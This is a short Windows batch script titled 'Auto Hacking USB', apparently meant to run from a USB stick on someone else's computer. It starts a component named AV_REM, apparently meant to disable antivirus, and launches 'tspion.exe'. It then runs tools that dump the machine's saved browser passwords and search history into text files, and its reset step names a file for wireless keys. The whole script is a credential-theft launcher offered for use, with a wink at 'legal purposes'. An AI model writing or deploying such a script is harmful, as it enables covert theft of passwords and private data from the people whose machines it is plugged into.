@echo off
title Auto Hacking USB ~~ Legal Purposes ;)
:begin
echo Make sure you read the readme before procceeding to make sure everything works.
pause
echo Would you like to reset the data files before initliazing? (Y or N)
set /p reset=
if %reset% == "Y" goto :DoReset
if %reset% == "y" goto :DoReset
if %reset% == "N" goto :l33t
if %reset% == "n" goto :l33t
:DoReset
cls
echo Deleting data files...
ping localhost -n 2 >nul
del daten.txt
del history.txt
del passwords.txt
del searches.txt
del wireless_keys.txt
cls
goto :l33t
:l33t
start .\App\AV_REM
ping localhost -n 5 >nul
start tspion.exe
start .\App\mylastsearch\MyLastSearch.exe /stext searches.txt
start .\App\WebPass\WebBrowserPassView.exe /stext passwords.txt
start .\App\CommandLine\Process.exe
pause
start .\App\options.bat
goto eof
